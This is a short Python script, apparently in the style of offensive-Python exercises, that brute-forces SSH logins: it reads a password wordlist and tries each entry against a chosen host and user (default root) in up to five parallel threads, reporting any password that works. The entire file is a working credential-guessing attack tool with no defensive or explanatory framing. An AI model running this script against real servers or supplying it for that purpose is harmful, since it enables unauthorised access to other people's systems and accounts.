import argparse
from pexpect import pxssh
from threading import *
from time import sleep

found=False
fails=0
connection_lock=BoundedSemaphore(value=5)

def connect_ssh(host,user,password,release):
    global found
    global fails
    try:
        s=pxssh.pxssh()
        s.login(host,user,password)
        print("[+] Password found: "+password)
        found=True
    except pxssh.ExceptionPxssh as e:
        if "read_nonblocking" in str(e):
            fails+=1
            sleep(5)
            connect_ssh(host,user,password,False)
        elif "synchronize with original prompt" in str(e):
            sleep(1)
            connect_ssh(host,user,password,False)
    finally:
        print("Finally")
        if release:
            connection_lock.release()      


def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('-H','--host',type=str,help='Specify target host',default='127.0.0.1')
    parser.add_argument('-u','--user',type=str,help='Specify username',default='root')
    parser.add_argument('-F','--file',type=str,help='Specify password file')
    args=parser.parse_args()
    host=args.host
    user=args.user
    pass_file=args.file
    if host==None or user==None or pass_file==None:
        print(parser.usage)
        exit(0)
    file=open(pass_file,'r')
    for p in file.readlines():
        if found:
            print("[+] Exiting Password found")
            exit(0)
        elif fails>5:
            print("[-] Exiting too many socket timeouts")
            exit(0)
        connection_lock.acquire()
        password=p.strip('\r').strip('\n')
        print("[-] Checking password: "+password)
        t=Thread(target=connect_ssh,args=(host,user,password,True))
        t.start()


if __name__=="__main__":
    main()